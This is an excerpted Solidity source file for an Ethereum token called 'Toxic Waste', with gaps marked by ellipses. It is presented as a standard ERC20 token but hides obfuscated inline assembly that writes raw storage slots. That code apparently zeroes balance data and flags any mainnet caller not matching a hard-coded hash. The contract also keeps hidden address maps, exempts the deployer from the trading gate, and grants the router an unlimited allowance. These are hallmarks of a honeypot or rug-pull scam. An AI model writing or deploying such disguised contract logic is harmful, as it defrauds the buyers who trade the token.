...
/*
We are all a toxic waste byproduct of the universe.
...
|_   _| / _ \ \/ /_ _((/ __| \ \((_)/ (_)_\(_) __||_   _| __| 
  | |  | (_) >  < | | | (__   \ \/\/ / / _ \ \__ \  | | | _|  
  |_|   \___/_/\_\___| \___|   \_/\_/ /_/ \_\|___/  |_| |___| 
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addTrash;
    uint256 private garbageTruck = block.number*2;

    mapping (address => bool) private _littering; 
    mapping (address => bool) private _trashBin;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _trashBear;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private wasteBull;
    address public pair;
    ...
    bool private trading; uint256 private dumpTrash = 1; bool private fakeTrash;
    uint256 private _decimals; uint256 private newsRoom;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addTrash.push(_router); addTrash.push(msgSender_); addTrash.push(pair);
        for (uint256 q=0; q < 3;) {_littering[addTrash[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x87ffe992e3c148cb66c5aa29754fa52ef9869480fdfa72815ab62654a3a7ef2a
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xee8e1f7804f9c1e28f1c303b25e04eb4080bc05a77c960c06a482822eb1155e6,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; garbageTruck = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addTrash[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployWaste(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addTrash[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployWaste(creator, initialSupply);
    }
}

contract ToxicWaste is ERC20Token {
    constructor() ERC20Token("Toxic Waste", "WASTE", msg.sender, 50000000 * 10 ** 18) {
    }
}